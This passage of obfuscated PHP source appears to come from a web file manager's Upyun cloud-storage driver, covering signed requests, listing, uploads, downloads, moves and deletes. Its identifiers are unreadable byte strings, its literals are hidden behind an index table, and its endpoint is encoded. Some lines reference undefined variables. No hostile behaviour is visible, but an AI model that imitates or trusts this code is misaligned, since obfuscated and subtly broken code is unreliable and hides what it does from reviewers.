size($È¯¶áÏ = false) { return $this->sourceSize; } public function getContent($Õß√Å√ó = false) { return $this->fileSubstr($Õß√Å√ó, 0, $this->sourceSize); } public function fileSubstr($õô≥´Ïã = false, $ááÈÌëÑ = 0, $Ô˘Ä®˘Ö = 0) { if (!$Ô˘Ä®˘Ö) { $Ô˘Ä®˘Ö = $this->sourceSize; } $∆ß›ê°◊ = $this->sourceSize - $ááÈÌëÑ; if ($Ô˘Ä®˘Ö >= $∆ß›ê°◊) { $Ô˘Ä®˘Ö = $∆ß›ê°◊; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ááÈÌëÑ, $Ô˘Ä®˘Ö); } if ($this->sourceType == self::TYPE_FILE) { if ($Ô˘Ä®˘Ö <= 0) { return $_SERVER[Á≈ ä ∞][22]; } $ä”ïÖﬂ≈ = ftell($this->source); fseek_64($this->source, $ä”ïÖﬂ≈ + $ááÈÌëÑ); $â„Î õ∂ = @fread($this->source, $Ô˘Ä®˘Ö); fseek_64($this->source, $ä”ïÖﬂ≈); return $â„Î õ∂; } } public function hashMd5($ÂÊŒîÍà = false) { return md5($this->getContent()); } public static function hash($◊ÿ´∏¿ , $¯¬¸¥¬“ = 0) { $ıÔªÍÊπ = new PathDriverStream($◊ÿ´∏¿ , $¯¬¸¥¬“); return $ıÔªÍÊπ->hashSimple($◊ÿ´∏¿ ); } public static function md5($ï¨ÆúæÀ, $ë¶àµ≤Ù = 0) { $ı¯–Ø©á = new PathDriverStream($ï¨ÆúæÀ, $ë¶àµ≤Ù); return $ı¯–Ø©á->hashMd5($ï¨ÆúæÀ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\x2f\57\166\60\56\141\160\151\x2e\165\160\x79\165\156\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($îßçÉ®≠) { parent::__construct(); $this->_init($îßçÉ®≠); } public function _init($íÆ≈¶∫ñ) { $ÌÓ•øƒª =& $_SERVER[Á≈ ä ∞]; foreach ($íÆ≈¶∫ñ as $˚ò˝–¯˙ => $Â‚öÈƒ≈) { if (isset($this->{$˚ò˝–¯˙})) { $this->{$˚ò˝–¯˙} = $Â‚öÈƒ≈; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÌÓ•øƒª[1456] . LNG($ÌÓ•øƒª[1387])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($…∂Üàè¢, $·ú˝‘ª‰ = "\x47\105\x54") { $æ Øå¥¡ =& $_SERVER[Á≈ ä ∞]; $≈ä∫â•§ = gmdate($æ Øå¥¡[1420]); $°ú¿ìÂπ = base64_encode(hash_hmac($æ Øå¥¡[1457], "{$·ú˝‘ª‰}\x26{$…∂Üàè¢}\x26{$≈ä∫â•§}", md5("{$this->userpass}"), !0)); $ëÿ´Ÿ∑∂ = array("\101\x75\x74\150\x6f\162\x69\172\x61\x74\x69\157\156\x3a\x55\x50\x59\125\x4e\40{$this->username}\x3a{$°ú¿ìÂπ}", "\x44\141\164\145\x3a{$≈ä∫â•§}"); return $ëÿ´Ÿ∑∂; } public function ussRequest($Œ£´”éó, $òâ£Âù = "\x47\x45\x54", $≈Ü‚‰π = false, $ã˚èú¬Õ = false, $¿˘‡—ÒÙ = false) { $Ç„ﬂûπ≤ =& $_SERVER[Á≈ ä ∞]; $Œ£´”éó = trim($Œ£´”éó, $Ç„ﬂûπ≤[18]); $•∏–¡Ÿ¬ = "\57{$this->bucket}\57{$Œ£´”éó}"; $øÊñªù÷ = $this->ussHeaders($•∏–¡Ÿ¬, $òâ£Âù); if ($ã˚èú¬Õ) { $øÊñªù÷ = array_merge($øÊñªù÷, $ã˚èú¬Õ); } $•Ç±Ûü£ = url_request($this->endpoint . $•∏–¡Ÿ¬, $òâ£Âù, $≈Ü‚‰π, $øÊñªù÷, $¿˘‡—ÒÙ); if (!$•Ç±Ûü£) { return array($Ç„ﬂûπ≤[1194] => !1, $Ç„ﬂûπ≤[1196] => $Ç„ﬂûπ≤[1458]); } if (strtolower($òâ£Âù) == $Ç„ﬂûπ≤[206] || in_array($•Ç±Ûü£[$Ç„ﬂûπ≤[1194]], array($Ç„ﬂûπ≤[1313], $Ç„ﬂûπ≤[1459]))) { $≈Ü‚‰π = $•Ç±Ûü£[$Ç„ﬂûπ≤[1460]]; } else { $≈Ü‚‰π = json_decode($•Ç±Ûü£[$Ç„ﬂûπ≤[1196]], !0); if (!$≈Ü‚‰π) { $≈Ü‚‰π = $•Ç±Ûü£[$Ç„ﬂûπ≤[1196]]; } else { if (!$•Ç±Ûü£[$Ç„ﬂûπ≤[757]] && isset($≈Ü‚‰π[$Ç„ﬂûπ≤[1461]])) { $≈Ü‚‰π = $≈Ü‚‰π[$Ç„ﬂûπ≤[1461]]; } } } return array($Ç„ﬂûπ≤[1194] => $•Ç±Ûü£[$Ç„ﬂûπ≤[757]], $Ç„ﬂûπ≤[1196] => $≈Ü‚‰π); } public function mkfile($…√©˛π‰, $∏ñò¥◊∆ = '', $˝¶Ã¬‹‡ = REPEAT_RENAME) { if ($this->setContent($…√©˛π‰, $∏ñò¥◊∆)) { return $this->getPathOuter($…√©˛π‰); } return !1; } public function mkdir($Ω∆∞†ùç, $âöŒ¸«é = REPEAT_SKIP) { $ÁÊÄ†Ò¡ =& $_SERVER[Á≈ ä ∞]; $Ì«ı’ﬁë = trim($Ω∆∞†ùç, $ÁÊÄ†Ò¡[18]); if ($this->_isFolder($Ì«ı’ﬁë)) { return $this->getPathOuter($Ì«ı’ﬁë); } $Õ®É‚ïº = array($ÁÊÄ†Ò¡[1462]); $œ¬»•Ï• = $this->ussRequest($Ì«ı’ﬁë, $ÁÊÄ†Ò¡[236], !1, $Õ®É‚ïº); return $œ¬»•Ï•[$ÁÊÄ†Ò¡[1194]] ? $this->getPathOuter($Ì«ı’ﬁë) : !1; } public function copyFile($√≠ñ∑ûË, $åØ≤Î¨) { $Îü ä∑∑ =& $_SERVER[Á≈ ä ∞]; $‡ØÔèœÚ = array($Îü ä∑∑[1463] . "\x2f{$this->bucket}\57{$√≠ñ∑ûË}", $Îü ä∑∑[1464]); $ÀÍœƒπµ = $this->ussRequest($åØ≤Î¨, $Îü ä∑∑[238], !1, $‡ØÔèœÚ); return $ÀÍœƒπµ[$Îü ä∑∑[1194]] ? !0 : $this->getPathOuter($åØ≤Î¨); } public function moveFile($»‰˙î≤–, $ì≠ﬂÃ¿Å) { $∫˝ΩÑæÚ =& $_SERVER[Á≈ ä ∞]; $Ω ˙Õ«‡ = array($∫˝ΩÑæÚ[1465] . "\57{$this->bucket}\57{$»‰˙î≤–}", $∫˝ΩÑæÚ[1464]); $º†¿—–à = $this->ussRequest($ì≠ﬂÃ¿Å, $∫˝ΩÑæÚ[238], !1, $Ω ˙Õ«‡); return $º†¿—–à[$∫˝ΩÑæÚ[1194]] ? !0 : $this->getPathOuter($ì≠ﬂÃ¿Å); } public function delFile($™õç®ÍÑ) { $ï›ÎŒºﬁ =& $_SERVER[Á≈ ä ∞]; $Úç¬≈ ƒ = $this->ussRequest($™õç®ÍÑ, $ï›ÎŒºﬁ[1466]); return $Úç¬≈ ƒ[$ï›ÎŒºﬁ[1194]] ? !0 : !1; } public function delFolder($€ˆ®¡‡≥) { $π£“ı’  =& $_SERVER[Á≈ ä ∞]; if (!$this->exist($€ˆ®¡‡≥)) { return !0; } $this->listItemCache = !1; $âá¸©Çì = $ ëÊƒ∆ú = array(); $this->fileList($€ˆ®¡‡≥, $âá¸©Çì, $ ëÊƒ∆ú, !0); $this->listItemCache = !0; foreach ($ ëÊƒ∆ú as $ä’ü‡Äñ) { $ŒŒ®Úº‘ = $this->ussRequest($ä’ü‡Äñ[$π£“ı’ [42]], $π£“ı’ [1466]); if (!$ŒŒ®Úº‘[$π£“ı’ [1194]]) { return !1; } } foreach ($âá¸©Çì as $é¨ô∂˚‘) { $ŒŒ®Úº‘ = $this->ussRequest($é¨ô∂˚‘, $π£“ı’ [1466]); if (!$ŒŒ®Úº‘[$π£“ı’ [1194]]) { return !1; } } $ŒŒ®Úº‘ = $this->ussRequest($€ˆ®¡‡≥, $π£“ı’ [1466]); return $ŒŒ®Úº‘[$π£“ı’ [1194]]; } public function rename($œﬂËÖÒ¬, $˙É€À≠œ) { if ($this->isFile($œﬂËÖÒ¬)) { $˙É€À≠œ = get_path_father($œﬂËÖÒ¬) . $˙É€À≠œ; return $this->moveFile($œﬂËÖÒ¬, $˙É€À≠œ); } return $this->renameObject($œﬂËÖÒ¬, $˙É€À≠œ); } public function fileInfo($ÍπÒ°ÉÔ, $°éÉÇ¡˘ = false, $“îºÕØÊ = array()) { $ÃπˆàΩÃ =& $_SERVER[Á≈ ä ∞]; $¨–îŸ∞À = array($ÃπˆàΩÃ[42] => $this->pathThis($ÍπÒ°ÉÔ), $ÃπˆàΩÃ[94] => $this->getPathOuter($ÃπˆàΩÃ[18] . $ÍπÒ°ÉÔ), $ÃπˆàΩÃ[43] => $ÃπˆàΩÃ[209], $ÃπˆàΩÃ[86] => isset($“îºÕØÊ[$ÃπˆàΩÃ[86]]) ? $“îºÕØÊ[$ÃπˆàΩÃ[86]] : 0, $ÃπˆàΩÃ[184] => $this->ext($ÍπÒ°ÉÔ)); if ($°éÉÇ¡˘) { return $¨–îŸ∞À; } $¨–îŸ∞À[$ÃπˆàΩÃ[210]] = $¨–îŸ∞À[$ÃπˆàΩÃ[95]] = 0; $¨–îŸ∞À[$ÃπˆàΩÃ[211]] = $¨–îŸ∞À[$ÃπˆàΩÃ[212]] = !0; if (empty($“îºÕØÊ)) { $“îºÕØÊ = $this->objectMeta($ÍπÒ°ÉÔ); if (!$“îºÕØÊ) { return $¨–îŸ∞À; } } $¨–îŸ∞À[$ÃπˆàΩÃ[210]] = intval($“îºÕØÊ[$ÃπˆàΩÃ[1467]]); $¨–îŸ∞À[$ÃπˆàΩÃ[95]] = intval($“îºÕØÊ[$ÃπˆàΩÃ[1468]]); $¨–îŸ∞À[$ÃπˆàΩÃ[86]] = $“îºÕØÊ[$ÃπˆàΩÃ[86]]; return $¨–îŸ∞À; } public function folderInfo($àÖ¨ú°¥, $Ä–öÑ° = false) { $∑ÙÈÎäß =& $_SERVER[Á≈ ä ∞]; $‘√«¶Öµ = array($∑ÙÈÎäß[42] => $this->pathThis($àÖ¨ú°¥), $∑ÙÈÎäß[94] => $this->getPathOuter($∑ÙÈÎäß[18] . $àÖ¨ú°¥), $∑ÙÈÎäß[43] => $∑ÙÈÎäß[85]); if ($Ä–öÑ°) { return $‘√«¶Öµ; } $‘√«¶Öµ[$∑ÙÈÎäß[210]] = $‘√«¶Öµ[$∑ÙÈÎäß[95]] = 0; $‘√«¶Öµ[$∑ÙÈÎäß[211]] = $‘√«¶Öµ[$∑ÙÈÎäß[212]] = !0; if (empty($ç¶÷∑ƒÃ)) { $ç¶÷∑ƒÃ = $this->objectMeta($àÖ¨ú°¥); if (!$ç¶÷∑ƒÃ) { return $‘√«¶Öµ; } } $‘√«¶Öµ[$∑ÙÈÎäß[210]] = intval($ç¶÷∑ƒÃ[$∑ÙÈÎäß[1467]]); $‘√«¶Öµ[$∑ÙÈÎäß[95]] = intval($ç¶÷∑ƒÃ[$∑ÙÈÎäß[1468]]); return $‘√«¶Öµ; } private function listObjs($˚†›õ≠Æ, $Õ¢ãÑ∂ı = 0, $¶ÒÕ¬∫Í = 1000) { $ßÁ¶à∂˙ =& $_SERVER[Á≈ ä ∞]; $¬á∫Ø≈Ù = array($ßÁ¶à∂˙[1469], $ßÁ¶à∂˙[1470] . $¶ÒÕ¬∫Í); if ($Õ¢ãÑ∂ı) { $¬á∫Ø≈Ù[] = $ßÁ¶à∂˙[1471] . $Õ¢ãÑ∂ı; } $ëîÿ€ÃÍ = $this->ussRequest($˚†›õ≠Æ, $ßÁ¶à∂˙[240], !1, $¬á∫Ø≈Ù); return !$ëîÿ€ÃÍ[$ßÁ¶à∂˙[1194]] ? !1 : $ëîÿ€ÃÍ[$ßÁ¶à∂˙[1196]]; } private function fileList($Ï‡ΩçÆÑ, &$ÔÕÕ–∫‡, &$êäèêÆ¸, $‹†¬ﬁì = false) { $√∑ﬁπµÜ =& $_SERVER[Á≈ ä ∞]; $µ¿ØÁÇ˛ = $√∑ﬁπµÜ[22]; $ëæÄƒÑÁ = 1000; $Èˆ≠úÅà = rtrim($Ï‡ΩçÆÑ, $√∑ﬁπµÜ[18]) . $√∑ﬁπµÜ[18]; while (!0) { check_abort(); $˘ùÆ‚‰Á = $this->listObjs($Ï‡ΩçÆÑ, $µ¿ØÁÇ˛, $ëæÄƒÑÁ); if (!$˘ùÆ‚‰Á) { return !1; } $µ¿ØÁÇ˛ = isset($˘ùÆ‚‰Á[$√∑ﬁπµÜ[1472]]) ? $˘ùÆ‚‰Á[$√∑ﬁπµÜ[1472]] : $√∑ﬁπµÜ[22]; $≥¸´Æ¡ç = isset($˘ùÆ‚‰Á[$√∑ﬁπµÜ[1473]]) ? $˘ùÆ‚‰Á[$√∑ﬁπµÜ[1473]] : array(); foreach ($≥¸´Æ¡ç as $ªÈÆÿäÙ) { $îÀèà∆◊ = $ªÈÆÿäÙ[$√∑ﬁπµÜ[43]] == $√∑ﬁπµÜ[85] ? !0 : !1; $∂òÃ≥É˘ = ltrim($Èˆ≠úÅà . $ªÈÆÿäÙ[$√∑ﬁπµÜ[42]], $√∑ﬁπµÜ[18]) . ($îÀèà∆◊ ? $√∑ﬁπµÜ[18] : $√∑ﬁπµÜ[22]); $’’≈êÒ≤ = array($√∑ﬁπµÜ[42] => $∂òÃ≥É˘, $√∑ﬁπµÜ[43] => $îÀèà∆◊ ? $√∑ﬁπµÜ[85] : $√∑ﬁπµÜ[209], $√∑ﬁπµÜ[86] => $ªÈÆÿäÙ[$√∑ﬁπµÜ[346]], $√∑ﬁπµÜ[1468] => $ªÈÆÿäÙ[$√∑ﬁπµÜ[1474]]); $this->cacheMethodInfoSet($∂òÃ≥É˘, $îÀèà∆◊, $’’≈êÒ≤); if ($îÀèà∆◊) { $ÔÕÕ–∫‡[] = $∂òÃ≥É˘; if ($‹†¬ﬁì) { $this->fileList($∂òÃ≥É˘, $ÔÕÕ–∫‡, $êäèêÆ¸, $‹†¬ﬁì); } continue; } $êäèêÆ¸[] = $’’≈êÒ≤; } if (count($≥¸´Æ¡ç) < $ëæÄƒÑÁ) { break; } } $this->cacheMethodInfoSet($Ï‡ΩçÆÑ, !0); } public function listPath($Ï£üûù·, $‡‡Å©‡ë = false) { $â≠€ƒå¥ =& $_SERVER[Á≈ ä ∞]; $ç˛úÀ“Â = $Ãò©†¯ß = array(); $this->fileList($Ï£üûù·, $ç˛úÀ“Â, $Ãò©†¯ß); foreach ($ç˛úÀ“Â as $™ﬁ˜âµ => $¥È˜∑ï†) { $ç˛úÀ“Â[$™ﬁ˜âµ] = $this->folderInfo($¥È˜∑ï†, $‡‡Å©‡ë); } foreach ($Ãò©†¯ß as $™ﬁ˜âµ => $¥È˜∑ï†) { $Ãò©†¯ß[$™ﬁ˜âµ] = $this->fileInfo($¥È˜∑ï†[$â≠€ƒå¥[42]], $‡‡Å©‡ë, $¥È˜∑ï†); } return array($â≠€ƒå¥[92] => $ç˛úÀ“Â, $â≠€ƒå¥[93] => $Ãò©†¯ß); } public function has($ßÿ¿Øâı, $≠˛√æˆÿ = false, $€¿˜ÖÆ≈ = true) { $…⁄ƒ™ìΩ =& $_SERVER[Á≈ ä ∞]; $úÔˆ≈í´ = $…⁄ƒ™ìΩ[22]; $—åÀÁ∆˜ = 500; $å„Ë•È˚ = 0; $Ù˜Ô™ÒÀ = 0; $ÑáÌË†« = rtrim($ßÿ¿Øâı, $…⁄ƒ™ìΩ[18]) . $…⁄ƒ™ìΩ[18]; while (!0) { check_abort(); $·©øï∞≈ = $this->listObjs($ßÿ¿Øâı, $úÔˆ≈í´, $—åÀÁ∆˜); if (!$·©øï∞≈) { return !1; } $úÔˆ≈í´ = isset($·©øï∞≈[$…⁄ƒ™ìΩ[1472]]) ? $·©øï∞≈[$…⁄ƒ™ìΩ[1472]] : $…⁄ƒ™ìΩ[22]; $ö∆ù¨’∆ = isset($·©øï∞≈[$…⁄ƒ™ìΩ[1473]]) ? $·©øï∞≈[$…⁄ƒ™ìΩ[1473]] : array(); if (empty($ö∆ù¨’∆)) { break; } $îúÈ‰Ú  = array_filter($ö∆ù¨’∆, function ($ŸΩÅ¢÷ﬁ) { $’˝¥ªø˛ =& $_SERVER[Á≈ ä ∞]; return $ŸΩÅ¢÷ﬁ[$’˝¥ªø˛[43]] == $’˝¥ªø˛[85]; }); $¸¬ãëº„ = count($ö∆ù¨’∆); $îúÈ‰Ú  = count($îúÈ‰Ú ); $ÿÛ˙ƒàÖ = $¸¬ãëº„ - $îúÈ‰Ú ; if ($≠˛√æˆÿ) { $Ù˜Ô™ÒÀ += $îúÈ‰Ú ; $å„Ë•È˚ += $ÿÛ˙ƒàÖ; if ($¸¬ãëº„ < $—åÀÁ∆˜) { break; } continue; } if ($€¿˜ÖÆ≈) { if ($ÿÛ˙ƒàÖ) { return !0; } } else { if ($îúÈ‰Ú ) { return !0; } } if ($¸¬ãëº„ < $—åÀÁ∆˜) { break; } } if ($≠˛√æˆÿ) { return array($…⁄ƒ™ìΩ[217] => $å„Ë•È˚, $…⁄ƒ™ìΩ[218] => $Ù˜Ô™ÒÀ); } return !1; } public function listAll($ÿ’§Î–Æ) { $∫Ì¿Ú‚€ =& $_SERVER[Á≈ ä ∞]; $º¬Àª˜Ä = $•®¯“√◊ = array(); $this->fileList($ÿ’§Î–Æ, $º¬Àª˜Ä, $•®¯“√◊, !0); $Ÿûﬂä˜» = array(); foreach ($•®¯“√◊ as $≤Â«›ßé) { $Ÿûﬂä˜»[$≤Â«›ßé[$∫Ì¿Ú‚€[42]]] = $≤Â«›ßé[$∫Ì¿Ú‚€[86]]; } foreach ($º¬Àª˜Ä as $≤Â«›ßé) { if (is_string($≤Â«›ßé)) { $Ÿûﬂä˜»[$≤Â«›ßé] = 0; } } return $this->listAllFiles($ÿ’§Î–Æ, array_keys($Ÿûﬂä˜»), $Ÿûﬂä˜»); } public function canRead($Ô‰Ç£ªû) { return $this->exist($Ô‰Ç£ªû) ? !0 : !1; } public function canWrite($«ºüÜë) { return $this->exist($«ºüÜë) ? !0 : !1; } public function getContent($üÙ—í–í) { return $this->fileSubstr($üÙ—í–í, 0, -1); } public function setContent($ö÷‘‹Ùë, $ÒÚ—”Ìë = '') { $ì‡˘≠¥° =& $_SERVER[Á≈ ä ∞]; if (!$ÒÚ—”Ìë) { $•ò◊ô∑ú = $this->ussRequest($ö÷‘‹Ùë, $ì‡˘≠¥°[236]); return $•ò◊ô∑ú[$ì‡˘≠¥°[1194]]; } $ı˜ôÆâÉ = $this->tempFile($this->pathThis($ö÷‘‹Ùë)); file_put_contents($ı˜ôÆâÉ, $ÒÚ—”Ìë); if ($this->upload($ö÷‘‹Ùë, $ı˜ôÆâÉ)) { $this->tempFileRemve($ı˜ôÆâÉ); return !0; } return !1; } public function fileSubstr($ë»›ôÀå, $üÑßØµﬂ, $…Ê∑ıÁ˛) { $ÙÇúâœ≠ =& $_SERVER[Á≈ ä ∞]; if (!($›≥å≈å± = $this->link($ë»›ôÀå))) { return !1; } $å·≥ÒÆÜ = !1; if ($…Ê∑ıÁ˛ > 0) { $À≥∫˜¡˙ = $üÑßØµﬂ + $…Ê∑ıÁ˛ - 1; $å·≥ÒÆÜ = array($ÙÇúâœ≠[1435] . $üÑßØµﬂ . $ÙÇúâœ≠[395] . $À≥∫˜¡˙); } $èäè≥·Û = url_request($›≥å≈å±, $ÙÇúâœ≠[240], !1, $å·≥ÒÆÜ); return $èäè≥·Û[$ÙÇúâœ≠[757]] ? $èäè≥·Û[$ÙÇúâœ≠[1196]] : !1; } public function upload($‡–é◊ÄÚ, $ª–¶È∫™, $ëú≠⁄àª = false, $€‡Ä£Ÿâ = REPEAT_REPLACE) { $˝ôÑﬁ†— =& $_SERVER[Á≈ ä ∞]; $Ìª´ﬁ´» = IO::size($ª–¶È∫™); if ($Ìª´ﬁ´» <= 1024 * 1024 * 200) { $ó·Á†®∂ = array($˝ôÑﬁ†—[1475] . $ª–¶È∫™); $˚üåä›õ = $this->ussRequest($‡–é◊ÄÚ, $˝ôÑﬁ†—[238], $ó·Á†®∂); return $˚üåä›õ[$˝ôÑﬁ†—[1194]] ? $this->getPathOuter($‡–é◊ÄÚ) : !1; } $ÏÅÛ˝¸Á = 1024 * 1024 * 10; $ïÈ‘ﬂÀ– = array($˝ôÑﬁ†—[1476], $˝ôÑﬁ†—[1477] . $Ìª´ﬁ´», $˝ôÑﬁ†—[1478], $˝ôÑﬁ†—[1479] . $ÏÅÛ˝¸Á); $˚üåä›õ = $this->ussRequest($‡–é◊ÄÚ, $˝ôÑﬁ†—[238], !1, $ïÈ‘ﬂÀ–); if (!$˚üåä›õ[$˝ôÑﬁ†—[1194]]) { return !1; } $÷ﬁè¨≥ = $˚üåä›õ[$˝ôÑﬁ†—[1196]]; $æﬂ“∞§– = 0; $ÑÇ‡ß•õ = $÷ﬁè¨≥[$˝ôÑﬁ†—[1480]]; $¯Ù„ﬁ”§ = fopen($ª–¶È∫™, $˝ôÑﬁ†—[1384]); if (!$¯Ù„ﬁ”§) { return !1; } do { $ƒÚ€Ö „ = $÷ﬁè¨≥[$˝ôÑﬁ†—[1481]]; fseek_64($¯Ù„ﬁ”§, $æﬂ“∞§–); $ˆâöíË˛ = fread($¯Ù„ﬁ”§, $ƒÚ€Ö „); $Û÷‡ˆ»Û = 0; do { $Û÷‡ˆ»Û++; $÷ﬁè¨≥ = $this->uploadPart($‡–é◊ÄÚ, $÷ﬁè¨≥, $ˆâöíË˛); } while (!$÷ﬁè¨≥ && $Û÷‡ˆ»Û < 3); if (!$÷ﬁè¨≥) { return !1; } $ÑÇ‡ß•õ = $÷ﬁè¨≥[$˝ôÑﬁ†—[1480]]; $æﬂ“∞§– += $ƒÚ€Ö „; } while ($ÑÇ‡ß•õ != -1); fclose($¯Ù„ﬁ”§); $ïÈ‘ﬂÀ– = array($˝ôÑﬁ†—[1482], $˝ôÑﬁ†—[1483] . $÷ﬁè¨≥[$˝ôÑﬁ†—[1484]], $˝ôÑﬁ†—[1478]); $˚üåä›õ = $this->ussRequest($‡–é◊ÄÚ, $˝ôÑﬁ†—[238], !1, $ïÈ‘ﬂÀ–); return $˚üåä›õ[$˝ôÑﬁ†—[1194]] ? $this->getPathOuter($Ê–˝œ¢√) : !1; } private function uploadPart($ß·˚—∞å, $—«˝ûŒŸ, &$—„É‡√É) { $œá¡—éŒ =& $_SERVER[Á≈ ä ∞]; $˚Ù«’ûﬁ = array($œá¡—éŒ[1485], $œá¡—éŒ[1483] . $—«˝ûŒŸ[$œá¡—éŒ[1484]], $œá¡—éŒ[1486] . $—«˝ûŒŸ[$œá¡—éŒ[1480]], $œá¡—éŒ[152] . $—«˝ûŒŸ[$œá¡—éŒ[1481]]); $»†Ãîõˆ = $this->ussRequest($ß·˚—∞å, $œá¡—éŒ[238], $—„É‡√É, $˚Ù«’ûﬁ); return !$»†Ãîõˆ[$œá¡—éŒ[1194]] ? $»†Ãîõˆ[$œá¡—éŒ[1194]] : $»†Ãîõˆ[$œá¡—éŒ[1196]]; } public function uploadFormData($∏⁄†πØ‘, $˛ì°ÈÒ⁄ = 3600) { return $this->uploadPolicy($∏⁄†πØ‘, $˛ì°ÈÒ⁄); } public function multiUploadFormData($÷îäœ˜À, $˝Œø˘€ß = 3600) { $ÊÒàóŸÓ =& $_SERVER[Á≈ ä ∞]; $ﬂ‹ŸÄÛ˜ = (int) $GLOBALS[$ÊÒàóŸÓ[17]][$ÊÒàóŸÓ[86]]; return $this->uploadPolicy($÷îäœ˜À, $˝Œø˘€ß, $ﬂ‹ŸÄÛ˜); } private function uploadPolicy($±ÂÎÄé˝, $∂˝æ˚À˜ = 3600, $·°É»ıß = 0) { $Î∏ˆ¢∏é =& $_SERVER[Á≈ ä ∞]; $Å¿±”ó∑ = $Î∏ˆ¢∏é[18] . $this->bucket; $Ñ◊ñäõÊ = gmdate($Î∏ˆ¢∏é[1420]); $˘ÿÁ∂¿Ü = array($Î∏ˆ¢∏é[1487] => $this->bucket, $Î∏ˆ¢∏é[1488] => $±ÂÎÄé˝, $Î∏ˆ¢∏é[1489] => time() + $∂˝æ˚À˜, $Î∏ˆ¢∏é[1490] => $Ñ◊ñäõÊ); if ($·°É»ıß) { $˘ÿÁ∂¿Ü[$Î∏ˆ¢∏é[1400]] = $·°É»ıß; } $§»Çòúô = base64_encode(json_encode($˘ÿÁ∂¿Ü)); $‰ú§Ñ≠¨ = base64_encode(hash_hmac($Î∏ˆ¢∏é[1457], "\120\117\x53\x54\46{$Å¿±”ó∑}\x26{$Ñ◊ñäõÊ}\46{$§»Çòúô}", md5("{$this->userpass}"), !0)); $¬›•ä∞‚ = array($Î∏ˆ¢∏é[1325] => $§»Çòúô, $Î∏ˆ¢∏é[1491] => "\x55\120\x59\x55\x4e\40{$this->username}\x3a{$‰ú§Ñ≠¨}", $Î∏ˆ¢∏é[191] => $this->endpoint . $Å¿±”ó∑); return $¬›•ä∞‚; } public function download($†◊ùà∏ﬁ, $∫ÛÁ˚‹›) { $œº–◊óõ = IO::getPathInner(IO::mkfile($∫ÛÁ˚‹›)); if (!($ô≥ﬁéÙ÷ = $this->link($†◊ùà∏ﬁ))) { return !1; } $œ¨ÓÇ°î = 0; $¬„Äƒ˙∂ = 1024 * 200; $·˝ë€‡˙ = fopen($œº–◊óõ, $_SERVER[Á≈ ä ∞][1441]); while (!0) { $®Æ•“ΩÄ = $this->fileSubstr($†◊ùà∏ﬁ, $œ¨ÓÇ°î, $¬„Äƒ˙∂); if ($®Æ•“ΩÄ === !1) { return !1; } fwrite($·˝ë€‡˙, $®Æ•“ΩÄ); $œ¨ÓÇ°î += $¬„Äƒ˙∂; if (strlen($®Æ•“ΩÄ) < $¬„Äƒ˙∂) { break; } } fclose($·˝ë€‡˙); return $∫ÛÁ˚‹›; } public function link($ÓÌ¡¡Å’, $É◊ Âèœ = array()) { $±ÌÊØØö =& $_SERVER[Á≈ ä ∞]; $ÓÌ¡¡Å’ = trim($ÓÌ¡¡Å’, $±ÌÊØØö[18]); if (!empty($this->token)) { $ì÷Ü‡ù¶ = strtotime(date($±ÌÊØØö[1492])); $ﬂ‘·∞ı≠ = substr(md5($this->token . $±ÌÊØØö[293] . $ì÷Ü‡ù¶ . $±ÌÊØØö[1493] . $ÓÌ¡¡Å’), 12, 8) . $ì÷Ü‡ù¶; $É◊ Âèœ[] = $±ÌÊØØö[1494] . $ﬂ‘·∞ı≠; } $√Í˝¥ÏÌ = !empty($É◊ Âèœ) ? $±ÌÊØØö[83] . implode($±ÌÊØØö[293], $É◊ Âèœ) : $±ÌÊØØö[22]; return $this->getHost() . $±ÌÊØØö[18] . $ÓÌ¡¡Å’ . $√Í˝¥ÏÌ; } public function fileOut($ò÷ï©˝Ú, $Ó îá≈ó = false, $ƒí¥›‹‹ = false, $÷Ñı≠Ã¸ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ò÷ï©˝Ú, $Ó îá≈ó, $ƒí¥›‹‹, $÷Ñı≠Ã¸); } if (!$ƒí¥›‹‹) { $ƒí¥›‹‹ = $this->pathThis($ò÷ï©˝Ú); } $úÇà∑∑˜ = $Ó îá≈ó ? array($_SERVER[Á≈ ä ∞][1495] . rawurlencode($ƒí¥›‹‹)) : array(); $∆“à‰ÿØ = $this->link($ò÷ï©˝Ú, $úÇà∑∑˜); $this->fileOutLink($∆“à‰ÿØ); } public function fileOutServer($ÄπÖÍ§£, $∆‘áÒÛ = false, $¬ˆ∂¯ÚÖ = false, $±å˛®œê = '') { parent::fileOut($ÄπÖÍ§£, $∆‘áÒÛ, $¬ˆ∂¯ÚÖ, $±å˛®œê); } public function fileOutImage($Õ°ÿÚ‹∞, $õ€©ÌµŸ = 250) { $Ó˘ò˜‚‘ = $this->link($Õ°ÿÚ‹∞ . $_SERVER[Á≈ ä ∞][1496] . $õ€©ÌµŸ); $this->fileOutLink($Ó˘ò˜‚‘); } public function fileOutImageServer($∂Í”Ÿàı, $≥‘ıÀ…» = 250) { parent::fileOutImage($∂Í”Ÿàı, $≥‘ıÀ…»); } public function hashMd5($‹´¯»˚î) { $¨∏åü¢è =& $_SERVER[Á≈ ä ∞]; $›ê«ãƒê = $this->_objectMeta($‹´¯»˚î); return isset($›ê«ãƒê[$¨∏åü¢è[222]]) ? $›ê«ãƒê[$¨∏åü¢è[222]] : !1; } public function size($ıèı˝õ™) { $∑¸¥ÂÕÚ = $this->objectMeta($ıèı˝õ™); return $∑¸¥ÂÕÚ ? $∑¸¥ÂÕÚ[$_SERVER[Á≈ ä ∞][86]] : 0; } public function info($≥É¡˛¡·) { if ($this->isFolder($≥É¡˛¡·)) { return $this->folderInfo($≥É¡˛¡·); } else { if ($this->isFile($≥É¡˛¡·)) { return $this->fileInfo($≥É¡˛¡·); } } return !1; } public function exist($öèüó˘√) { return $this->isFile($öèüó˘√) || $this->isFolder($öèüó˘√); } public function isFile($ﬂÑ”Ì‹‘) { return !$this->isFolder($ﬂÑ”Ì‹‘) && $this->objectMeta($ﬂÑ”Ì‹‘); } public function isFolder($°ÅÜÙ›Ú) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][175], $°ÅÜÙ›Ú); } protected function objectMeta($Ω—‡≠‡æ) { return $this->cacheMethod($_SERVER[Á≈ ä ∞][177], $Ω—‡≠‡æ); } protected function 